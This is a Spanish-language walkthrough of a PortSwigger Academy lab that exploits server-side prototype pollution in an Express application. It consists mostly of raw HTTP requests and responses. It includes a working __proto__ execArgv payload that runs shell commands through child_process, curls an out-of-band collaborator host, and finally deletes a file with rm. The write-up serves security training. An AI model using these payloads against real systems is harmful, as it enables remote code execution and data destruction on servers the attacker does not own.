---
description: >-
  https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution
---

# Lab 9: Remote code execution via server-side prototype pollution

Primero encontramos la siguiente peticion:

{% code overflow="wrap" %}
```json
POST /my-account/change-address HTTP/2
Host: 0ade001c03d1540682f0971f00b70020.web-security-academy.net
Cookie: session=9Z8pN21fPP7CZIMDolCzh7uAfP6FL594
Content-Length: 168
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */
Origin: https://0ade001c03d1540682f0971f00b70020.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ade001c03d1540682f0971f00b70020.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"9Z8pN21fPP7CZIMDolCzh7uAfP6FL594"}
```
{% endcode %}

Lo anterior responde asi:

{% code overflow="wrap" %}
```json
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"c4-o1d3jaxaEdwNnwhzORq6DYSiPxI"
Date: Tue, 25 Jun 2024 21:11:35 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 196

{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":true}
```
{% endcode %}

Teniendo en cuenta lo anterior, enviamos la siguiente peticion:

{% code overflow="wrap" %}
```json
POST /my-account/change-address HTTP/2
Host: 0ade001c03d1540682f0971f00b70020.web-security-academy.net
Cookie: session=9Z8pN21fPP7CZIMDolCzh7uAfP6FL594
Content-Length: 208
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */
Origin: https://0ade001c03d1540682f0971f00b70020.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ade001c03d1540682f0971f00b70020.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"9Z8pN21fPP7CZIMDolCzh7uAfP6FL594","__proto__": {
    "json spaces":10
}}
```
{% endcode %}

Y lo anterior, entrego la siguiente respuesta en raw:

```json
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"14e-/rxYzhSfiD4zL1vVonmGpZgVmW0"
Date: Tue, 25 Jun 2024 21:11:52 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 334

{
          "username": "wiener",
          "firstname": "Peter",
          "lastname": "Wiener",
          "address_line_1": "Wiener HQ",
          "address_line_2": "One Wiener Way",
          "city": "Wienerville",
          "postcode": "BU1 1RP",
          "country": "UK",
          "isAdmin": true,
          "json spaces": 10
}
```

Los 10 espacios antecedidos por cada objeto indica que es susceptible a este tipo de ataques.

Al acceder al apartado de admin:

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

Al clickear al button previo se genera la siguiente petición:

{% code overflow="wrap" %}
```json
POST /admin/jobs HTTP/2
Host: 0ade001c03d1540682f0971f00b70020.web-security-academy.net
Cookie: session=9Z8pN21fPP7CZIMDolCzh7uAfP6FL594
Content-Length: 126
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */
Origin: https://0ade001c03d1540682f0971f00b70020.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ade001c03d1540682f0971f00b70020.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"csrf":"E5PnMR6lCAZooCcKBud78idhOfsoN5TZ","sessionId":"9Z8pN21fPP7CZIMDolCzh7uAfP6FL594","tasks":["db-cleanup","fs-cleanup"]}
```
{% endcode %}

La petición previa entrega la siguiente respuesta:

{% code overflow="wrap" %}
```json
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"1c7-o/UMl8aG2WYfWY22q3KHWd04RGU"
Date: Tue, 25 Jun 2024 21:16:53 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 455

{
          "results": [
                    {
                              "name": "db-cleanup",
                              "description": "Database cleanup",
                              "success": true
                    },
                    {
                              "name": "fs-cleanup",
                              "description": "Filesystem cleanup",
                              "success": true
                    }
          ]
}
```
{% endcode %}

Esto genera tareas en segundo plano que limpian la base de datos y el sistema de archivos.

Por lo anterior, generamos un collaborator y enviamos la siguiente peticion:

{% code overflow="wrap" %}
```json
POST /admin/jobs HTTP/2
Host: 0ade001c03d1540682f0971f00b70020.web-security-academy.net
Cookie: session=9Z8pN21fPP7CZIMDolCzh7uAfP6FL594
Content-Length: 272
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */
Origin: https://0ade001c03d1540682f0971f00b70020.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ade001c03d1540682f0971f00b70020.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"csrf":"E5PnMR6lCAZooCcKBud78idhOfsoN5TZ","sessionId":"9Z8pN21fPP7CZIMDolCzh7uAfP6FL594","tasks":["db-cleanup","fs-cleanup"],"__proto__": {
    "execArgv":["--eval=require('child_process').execSync('curl https://zvy90na6d8f1qtspeihq8wqvemkd83ws.oastify.com')"
    ]
}}
```
{% endcode %}

Y la peticion previa se uso el siguiente payload:

```json
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
```

La respuesta de esta petición fue la siguiente:

```json
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"1e3-FCLLKbEoTy1W0ntJnbriVtYsbfg"
Date: Tue, 25 Jun 2024 21:19:42 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 483

{
          "results": [
                    {
                              "name": "db-cleanup",
                              "success": true,
                              "message": "Child process executed successfully"
                    },
                    {
                              "name": "fs-cleanup",
                              "success": true,
                              "message": "Child process executed successfully"
                    }
          ]
}
```

Y en nuestro collaborator se logro recibir el trafico:

<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

El payload para resolver el ejercicio es el siguiente:

```json
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
}
```
